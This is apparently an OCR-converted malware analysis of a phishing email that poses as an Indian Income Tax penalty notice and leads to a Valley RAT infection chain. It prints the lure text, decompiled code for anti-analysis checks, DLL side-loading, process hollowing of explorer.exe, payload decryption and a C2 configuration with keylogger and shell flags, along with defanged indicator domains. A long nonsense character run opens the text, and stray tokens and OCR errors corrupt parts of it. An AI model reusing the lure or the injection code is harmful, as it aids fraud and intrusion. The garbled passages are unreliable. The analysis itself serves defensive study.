6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  